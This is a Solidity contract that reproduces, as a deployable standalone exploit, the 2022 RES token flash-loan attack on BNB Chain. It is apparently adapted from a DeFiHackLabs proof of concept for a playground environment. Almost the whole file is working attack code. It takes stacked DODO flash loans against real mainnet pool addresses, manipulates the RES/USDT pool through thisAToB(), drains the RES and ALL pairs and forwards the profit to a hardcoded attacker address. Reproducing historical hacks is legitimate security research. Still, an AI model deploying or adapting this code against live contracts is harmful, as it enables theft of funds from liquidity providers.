// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// Synthetic standalone exploit for the EVM Playground (2022-10-RES_exp2).
//
// The DeFiHackLabs PoC (test/RES_exp2.sol) runs the whole attack INLINE in the
// Foundry `ContractTest` test contract — the DODO flash-loan callback
// `DPPFlashLoanCall` lives on the test itself, and the WBNB-mint mock flashloan
// and sellRES/sellALL helpers are all test methods. There is therefore no
// standalone attack contract to deploy. This file is a faithful, self-contained
// copy of that inline attack: the mock WBNB seed, the stacked DODO flash loans,
// the `DPPFlashLoanCall` callback (buyRES x4 → thisAToB() → sellRES → sellALL →
// repay), so the playground can deploy it and record `run()`.
//
// Logic + constants are copied verbatim from the registry's
// test/RES_exp2.sol. The only deviation is the constructor-deployed
// `ReceiveToken` helper (whose only role is to approve the router for RES/ALL,
// then selfdestruct) is replaced by an inline helper, and the test's `address
// this` recipient becomes the attacker EOA. The CREATE2 deploy address of
// `ReceiveToken` is irrelevant to the attack (it only needs SOME contract that
// has pre-approved the router), so we deploy our own approver and use that.

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
    function transferFrom(address, address, uint256) external returns (bool);
}

interface IRES is IERC20 {
    function thisAToB() external;
}

interface IWBNB is IERC20 {
    function deposit() external payable;
}

interface IUniswapV2Router {
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}

interface IUniswapV2Pair {
    function getReserves() external view returns (uint112, uint112, uint32);
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
}

interface IDVM {
    function flashLoan(uint256 baseAmount, uint256 quoteAmount, address assetTo, bytes calldata data) external;
}

contract TokenApprover {
    constructor() {
        IRES RES_TOKEN = IRES(0xecCD8B08Ac3B587B7175D40Fb9C60a20990F8D21);
        IERC20 ALL_TOKEN = IERC20(0x04C0f31C0f59496cf195d2d7F1dA908152722DE7);
        RES_TOKEN.approve(msg.sender, type(uint256).max);
        ALL_TOKEN.approve(msg.sender, type(uint256).max);
        selfdestruct(payable(msg.sender));
    }
}

contract RESExploit {
    // --- actors / tokens / pools (verbatim from the Foundry PoC) ----------------
    IUSDT constant USDT_TOKEN = IUSDT(0x55d398326f99059fF775485246999027B3197955);
    IRES constant RES_TOKEN = IRES(0xecCD8B08Ac3B587B7175D40Fb9C60a20990F8D21);
    IERC20 constant ALL_TOKEN = IERC20(0x04C0f31C0f59496cf195d2d7F1dA908152722DE7);
    IWBNB constant WBNB_TOKEN = IWBNB(payable(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c));
    IUniswapV2Router constant PS_ROUTER =
        IUniswapV2Router(0x10ED43C718714eb63d5aA57B78B54704E256024E);
    IUniswapV2Pair constant USDT_RES_PAIR = IUniswapV2Pair(0x05ba2c512788bd95cd6D61D3109c53a14b01c82A);
    IUniswapV2Pair constant USDT_ALL_PAIR = IUniswapV2Pair(0x1B214e38C5e861c56e12a69b6BAA0B45eFe5C8Eb);
    address constant dodo = 0xD7B7218D778338Ea05f5Ecce82f86D365E25dBCE;
    address constant dodo2 = 0x9ad32e3054268B849b84a8dBcC7c8f7c52E4e69A;

    address constant ATTACKER = 0x986b2e2a1cf303536138d8aC762447500Fd781c6;

    // flash-loan amounts captured in the outer call, repaid in the inner callback.
    uint256 private amount;
    uint256 private amount2;
    address private add; // deployer-approved helper address (ReceiveToken analogue)

    // USDT balance snapshot taken after the WBNB→USDT seed swap; net profit is
    // measured against it (mirrors USDTBefore in the test).
    uint256 private usdtBefore;

    function run() external payable {
        // use mint WBNB to mock flashLoan (the test's seed capital). The Foundry
        // test calls `address(WBNB).call{value: 30_000 ether}("")` — an empty-
        // calldata value call that triggers WBNB's payable deposit() path. Mirror
        // that exactly (an explicit deposit() selector is NOT how WBNB is wrapped).
        (bool ok,) = address(WBNB_TOKEN).call{value: 30_000 ether}("");
        require(ok, "mock WBNB mint failed");
        _WBNBToUSDT();
        usdtBefore = USDT_TOKEN.balanceOf(address(this));

        amount = USDT_TOKEN.balanceOf(dodo);
        amount2 = USDT_TOKEN.balanceOf(dodo2);
        USDT_TOKEN.approve(address(PS_ROUTER), type(uint256).max);
        RES_TOKEN.approve(address(PS_ROUTER), type(uint256).max);
        ALL_TOKEN.approve(address(PS_ROUTER), type(uint256).max);

        // Deploy the approver helper — its constructor approves the router for
        // RES/ALL on its own address, then selfdestructs back to us. Mirrors the
        // test's CREATE2 of ReceiveToken.
        add = address(new TokenApprover());

        // Stacked DODO flash loans: the outer loan's callback takes the second
        // loan, runs the attack, and repays both before returning.
        IDVM(dodo2).flashLoan(0, amount2, address(this), new bytes(1));

        // forward any residual USDT profit to the attacker EOA.
        USDT_TOKEN.transfer(ATTACKER, USDT_TOKEN.balanceOf(address(this)));
    }

    // --- DODO flash-loan callback (copied verbatim from ContractTest) ----------
    function DPPFlashLoanCall(address, uint256, uint256, bytes calldata) external {
        if (msg.sender == dodo2) {
            IDVM(dodo).flashLoan(0, amount, address(this), new bytes(1));
            USDT_TOKEN.transfer(dodo2, amount2);
        } else {
            // get RES — corner the pool & park fee RES into the token contract.
            uint256 amountBuy = USDT_TOKEN.balanceOf(address(this)) / 4;
            buyRES(amountBuy);
            buyRES(amountBuy);
            buyRES(amountBuy);
            buyRES(amountBuy);
            // Burn RES in LP — the vulnerability: swap-through-pool + burn-from-pool.
            RES_TOKEN.thisAToB();
            // Sell RES , ALL — drain the now-degenerate pools.
            sellRES();
            sellALL();
            USDT_TOKEN.transfer(dodo, amount);
        }
    }

    function _WBNBToUSDT() internal {
        WBNB_TOKEN.approve(address(PS_ROUTER), type(uint256).max);
        address[] memory path = new address[](2);
        path[0] = address(WBNB_TOKEN);
        path[1] = address(USDT_TOKEN);
        PS_ROUTER.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            WBNB_TOKEN.balanceOf(address(this)), 0, path, address(this), block.timestamp
        );
    }

    function buyRES(uint256 amountBuy) internal {
        address[] memory path = new address[](2);
        path[0] = address(USDT_TOKEN);
        path[1] = address(RES_TOKEN);
        PS_ROUTER.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            amountBuy, 0, path, add, block.timestamp
        );
    }

    function sellRES() internal {
        (uint256 reserve0, uint256 reserve1,) = USDT_RES_PAIR.getReserves();
        RES_TOKEN.transferFrom(add, address(USDT_RES_PAIR), RES_TOKEN.balanceOf(add));
        uint256 amountin = RES_TOKEN.balanceOf(address(USDT_RES_PAIR)) - reserve1;
        uint256 amountout = amountin * 9975 * reserve0 / (reserve1 * 10_000 + amountin * 9975);
        USDT_RES_PAIR.swap(amountout, 0, address(this), "");
    }

    function sellALL() internal {
        (uint256 reserve0, uint256 reserve1,) = USDT_ALL_PAIR.getReserves();
        ALL_TOKEN.transferFrom(add, address(USDT_ALL_PAIR), ALL_TOKEN.balanceOf(add));
        uint256 amountin = ALL_TOKEN.balanceOf(address(USDT_ALL_PAIR)) - reserve0;
        uint256 amountout = amountin * 9975 * reserve1 / (reserve0 * 10_000 + amountin * 9975);
        USDT_ALL_PAIR.swap(0, amountout, address(this), "");
    }

    receive() external payable {}
}

// Minimal USDT interface — BSC USDT (BEP20) returns a bool from transfer and
// has standard balanceOf/approve; the test uses IUSDT only for the constant.
interface IUSDT is IERC20 {}
